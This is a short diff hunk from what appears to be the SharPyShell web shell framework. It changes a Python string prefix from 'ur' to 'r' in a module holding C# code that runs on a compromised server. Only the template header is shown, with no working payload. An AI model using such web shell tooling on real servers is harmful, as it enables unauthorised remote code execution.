@@ -20,7 +20,7 @@ class Module(Singleton):
         """
     '''runtime_code must have the class name "SharPyShell" and the main function name "ExecRuntime". The ExecRuntime 
        function will be the code run on the server and it must return results in byte[] type '''
-    _runtime_code = ur"""
+    _runtime_code = r"""
                 using System;using System.IO;using System.Diagnostics;using System.Text;
                 public class SharPyShell
                 {                    
